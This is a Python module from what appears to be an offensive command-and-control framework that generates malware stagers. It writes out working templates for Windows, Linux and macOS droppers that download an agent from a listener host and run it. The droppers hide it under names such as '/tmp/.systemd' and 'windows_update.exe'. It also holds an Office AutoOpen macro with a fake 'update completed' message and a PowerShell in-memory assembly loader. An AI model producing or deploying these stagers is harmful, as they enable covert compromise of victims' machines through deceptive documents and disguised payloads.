# kush-framework/kush/core/stager_manager.py
"""
Stager manager for Empire-style stagers - COMPLETELY FIXED VERSION
"""

import os
import base64
import random
import string
from pathlib import Path
from typing import Dict, List, Optional, Any
from colorama import Fore, Style

class StagerManager:
    def __init__(self, listener_manager=None):
        self.stagers: Dict[str, Any] = {}
        self.stager_options: Dict[str, Dict[str, Any]] = {}
        self.listener_manager = listener_manager
        
        # Load built-in stagers
        self._load_builtin_stagers()
    
    def _load_builtin_stagers(self):
        """Load built-in stagers"""
        # Windows Dropper
        self.stagers['windows_dropper'] = {
            'name': 'windows_dropper',
            'description': 'Windows executable that downloads and executes agent',
            'author': 'Kush Team',
            'options': [
                {'name': 'Listener', 'description': 'Listener to use', 'required': True},
                {'name': 'OutFile', 'description': 'Output file name', 'required': False, 'default': 'payload.exe'},
            ]
        }
        
        # Windows Macro
        self.stagers['windows_macro'] = {
            'name': 'windows_macro',
            'description': 'Office macro that downloads and executes agent',
            'author': 'Kush Team',
            'options': [
                {'name': 'Listener', 'description': 'Listener to use', 'required': True},
                {'name': 'OutFile', 'description': 'Output file name', 'required': False, 'default': 'macro.vba'},
            ]
        }
        
        # Linux Dropper
        self.stagers['linux_dropper'] = {
            'name': 'linux_dropper',
            'description': 'Linux ELF binary that downloads and executes agent',
            'author': 'Kush Team',
            'options': [
                {'name': 'Listener', 'description': 'Listener to use', 'required': True},
                {'name': 'OutFile', 'description': 'Output file name', 'required': False, 'default': 'payload.elf'},
            ]
        }
        
        # macOS Dropper
        self.stagers['macos_dropper'] = {
            'name': 'macos_dropper',
            'description': 'macOS Mach-O binary that downloads and executes agent',
            'author': 'Kush Team',
            'options': [
                {'name': 'Listener', 'description': 'Listener to use', 'required': True},
                {'name': 'OutFile', 'description': 'Output file name', 'required': False, 'default': 'payload.macho'},
            ]
        }
        
        # PowerShell Stager
        self.stagers['powershell'] = {
            'name': 'powershell',
            'description': 'PowerShell script that downloads and executes agent',
            'author': 'Kush Team',
            'options': [
                {'name': 'Listener', 'description': 'Listener to use', 'required': True},
                {'name': 'OutFile', 'description': 'Output file name', 'required': False, 'default': 'stager.ps1'},
            ]
        }
        
        # Initialize options
        for stager_name in self.stagers:
            self.stager_options[stager_name] = {}
            for option in self.stagers[stager_name]['options']:
                self.stager_options[stager_name][option['name']] = option.get('default', '')
    
    def get_stagers(self) -> List[Dict[str, Any]]:
        """Get all available stagers"""
        return list(self.stagers.values())
    
    def get_stager(self, stager_name: str) -> Optional[Dict[str, Any]]:
        """Get specific stager"""
        return self.stagers.get(stager_name)
    
    def set_option(self, stager_name: str, option: str, value: str) -> bool:
        """Set stager option"""
        if stager_name not in self.stager_options:
            return False
        
        self.stager_options[stager_name][option] = value
        return True
    
    def get_option(self, stager_name: str, option: str) -> Optional[str]:
        """Get stager option value"""
        if stager_name not in self.stager_options:
            return None
        return self.stager_options[stager_name].get(option)
    
    def generate_stager(self, stager_name: str) -> Optional[str]:
        """Generate a stager"""
        if stager_name not in self.stagers:
            print(f"{Fore.RED}[-] Stager '{stager_name}' not found{Style.RESET_ALL}")
            return None
        
        options = self.stager_options[stager_name]
        listener_name = options.get('Listener')
        out_file = options.get('OutFile', 'payload.exe')
        
        print(f"{Fore.CYAN}[*] Generating stager: {stager_name}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Listener specified: {listener_name}{Style.RESET_ALL}")
        
        if not listener_name:
            print(f"{Fore.RED}[-] Listener not specified{Style.RESET_ALL}")
            return None
        
        # Get listener configuration - FIXED: Properly access listener options
        listener_host = '0.0.0.0'
        listener_port = '8080'
        
        if self.listener_manager:
            print(f"{Fore.CYAN}[*] Listener manager available{Style.RESET_ALL}")
            if hasattr(self.listener_manager, 'listener_options'):
                listener_options = self.listener_manager.listener_options.get(listener_name, {})
                listener_host = listener_options.get('Host', '0.0.0.0')
                listener_port = listener_options.get('Port', '8080')
                print(f"{Fore.CYAN}[*] Retrieved listener options: {listener_host}:{listener_port}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[!] Listener manager has no listener_options attribute{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[!] No listener manager available{Style.RESET_ALL}")
        
        # Create stagers directory
        stagers_dir = Path("stagers")
        stagers_dir.mkdir(exist_ok=True)
        
        output_path = stagers_dir / out_file
        
        try:
            print(f"{Fore.CYAN}[*] Creating stager at: {output_path}{Style.RESET_ALL}")
            
            if stager_name == 'windows_dropper':
                result = self._generate_windows_dropper(output_path, listener_name, listener_host, listener_port)
            elif stager_name == 'linux_dropper':
                result = self._generate_linux_dropper(output_path, listener_name, listener_host, listener_port)
            elif stager_name == 'macos_dropper':
                result = self._generate_macos_dropper(output_path, listener_name, listener_host, listener_port)
            elif stager_name == 'windows_macro':
                result = self._generate_windows_macro(output_path, listener_name, listener_host, listener_port)
            elif stager_name == 'powershell':
                result = self._generate_powershell(output_path, listener_name, listener_host, listener_port)
            else:
                print(f"{Fore.RED}[-] Unknown stager type: {stager_name}{Style.RESET_ALL}")
                return None
            
            if result:
                print(f"{Fore.GREEN}[+] Stager generated successfully: {result}{Style.RESET_ALL}")
            return result
                
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to generate stager: {e}{Style.RESET_ALL}")
            import traceback
            traceback.print_exc()
            return None
    
    def _generate_windows_dropper(self, output_path: Path, listener_name: str, host: str, port: str) -> str:
        """Generate Windows dropper executable"""
        content = f'''#!/usr/bin/env python3
# Windows Dropper for Kush Framework
# Listener: {listener_name} ({host}:{port})

import os
import sys
import requests
import subprocess
import tempfile

def main():
    try:
        # Download agent from listener
        agent_url = "http://{host}:{port}/agent.exe"
        print(f"[*] Downloading agent from {{agent_url}}")
        response = requests.get(agent_url, timeout=30)
        
        if response.status_code == 200:
            # Save to temp directory
            temp_dir = tempfile.gettempdir()
            agent_path = os.path.join(temp_dir, "windows_update.exe")
            
            with open(agent_path, "wb") as f:
                f.write(response.content)
            
            print(f"[+] Agent downloaded to {{agent_path}}")
            
            # Execute agent
            subprocess.Popen([agent_path], shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("[+] Agent executed successfully")
        else:
            print(f"[-] Failed to download agent: HTTP {{response.status_code}}")
        
    except Exception as e:
        print(f"[-] Error: {{e}}")

if __name__ == "__main__":
    main()
'''
        
        with open(output_path, 'w') as f:
            f.write(content)
        
        print(f"{Fore.YELLOW}[!] Note: This is a Python script. Compile to EXE using PyInstaller:{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] pyinstaller --onefile --noconsole {output_path}{Style.RESET_ALL}")
        
        return str(output_path)
    
    def _generate_linux_dropper(self, output_path: Path, listener_name: str, host: str, port: str) -> str:
        """Generate Linux dropper executable"""
        content = f'''#!/bin/bash
# Linux Dropper for Kush Framework
# Listener: {listener_name} ({host}:{port})

echo "[*] Downloading agent from http://{host}:{port}/agent.elf"

# Download and execute agent
if curl -s http://{host}:{port}/agent.elf -o /tmp/.systemd; then
    chmod +x /tmp/.systemd
    echo "[+] Agent downloaded and executing"
    /tmp/.systemd &
else
    echo "[-] Failed to download agent"
fi
'''
        
        with open(output_path, 'w') as f:
            f.write(content)
        
        # Make executable
        os.chmod(output_path, 0o755)
        
        return str(output_path)
    
    def _generate_macos_dropper(self, output_path: Path, listener_name: str, host: str, port: str) -> str:
        """Generate macOS dropper executable"""
        content = f'''#!/bin/bash
# macOS Dropper for Kush Framework  
# Listener: {listener_name} ({host}:{port})

echo "[*] Downloading agent from http://{host}:{port}/agent.macho"

# Download and execute agent
if curl -s http://{host}:{port}/agent.macho -o /tmp/.coreservices; then
    chmod +x /tmp/.coreservices
    echo "[+] Agent downloaded and executing"
    /tmp/.coreservices &
else
    echo "[-] Failed to download agent"
fi
'''
        
        with open(output_path, 'w') as f:
            f.write(content)
        
        # Make executable
        os.chmod(output_path, 0o755)
        
        return str(output_path)
    
    def _generate_windows_macro(self, output_path: Path, listener_name: str, host: str, port: str) -> str:
        """Generate Windows Office macro"""
        content = f'''Sub AutoOpen()
    Dim xHttp As Object
    Dim bStrm As Object
    Dim agentPath As String
    
    agentPath = "C:\\Windows\\Temp\\windows_update.exe"
    
    On Error GoTo ErrorHandler
    
    Set xHttp = CreateObject("Microsoft.XMLHTTP")
    Set bStrm = CreateObject("Adodb.Stream")
    
    xHttp.Open "GET", "http://{host}:{port}/agent.exe", False
    xHttp.Send
    
    If xHttp.Status = 200 Then
        With bStrm
            .Type = 1
            .Open
            .write xHttp.responseBody
            .savetofile agentPath, 2
        End With
        
        CreateObject("Wscript.Shell").Run agentPath, 0, False
        MsgBox "Update completed successfully!", vbInformation
    Else
        MsgBox "Update failed: " & xHttp.Status, vbExclamation
    End If
    
    Exit Sub
    
ErrorHandler:
    MsgBox "Error during update: " & Err.Description, vbCritical
End Sub
'''
        
        with open(output_path, 'w') as f:
            f.write(content)
        
        return str(output_path)
    
    def _generate_powershell(self, output_path: Path, listener_name: str, host: str, port: str) -> str:
        """Generate PowerShell stager"""
        content = f'''# PowerShell Stager for Kush Framework
# Listener: {listener_name} ({host}:{port})

Write-Host "[*] Downloading agent from http://{host}:{port}/agent.exe"

try {{
    $webClient = New-Object System.Net.WebClient
    $payload = $webClient.DownloadData("http://{host}:{port}/agent.exe")
    $assembly = [System.Reflection.Assembly]::Load($payload)
    $entryPoint = $assembly.EntryPoint
    $entryPoint.Invoke($null, $null)
    Write-Host "[+] Agent executed successfully"
}} catch {{
    Write-Host "[-] Error: $_"
}}
'''

        
        with open(output_path, 'w') as f:
            f.write(content)
        
        return str(output_path)